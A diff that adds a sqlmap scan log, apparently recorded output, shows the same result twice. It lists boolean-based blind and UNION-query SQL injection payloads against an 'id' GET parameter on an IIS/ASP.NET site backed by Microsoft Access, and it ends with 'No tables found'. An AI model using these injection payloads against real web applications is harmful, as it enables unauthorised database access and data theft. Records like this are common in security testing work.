@@ -1,0 +1,31 @@
+sqlmap identified the following injection points with a total of 19 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 2503=2503
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=-4633 UNION ALL SELECT NULL,CHR(113)&CHR(122)&CHR(122)&CHR(120)&CHR(113)&CHR(71)&CHR(82)&CHR(81)&CHR(87)&CHR(98)&CHR(75)&CHR(98)&CHR(75)&CHR(76)&CHR(116)&CHR(113)&CHR(112)&CHR(98)&CHR(98)&CHR(113),NULL,NULL FROM MSysAccessObjects%16
+---
+web server operating system: Windows 2008 R2 or 7
+web application technology: Microsoft IIS 7.5, ASP.NET, ASP
+back-end DBMS: Microsoft Access
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 2503=2503
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=-4633 UNION ALL SELECT NULL,CHR(113)&CHR(122)&CHR(122)&CHR(120)&CHR(113)&CHR(71)&CHR(82)&CHR(81)&CHR(87)&CHR(98)&CHR(75)&CHR(98)&CHR(75)&CHR(76)&CHR(116)&CHR(113)&CHR(112)&CHR(98)&CHR(98)&CHR(113),NULL,NULL FROM MSysAccessObjects%16
+---
+web server operating system: Windows 2008 R2 or 7
+web application technology: Microsoft IIS 7.5, ASP.NET, ASP
+back-end DBMS: Microsoft Access
+No tables found
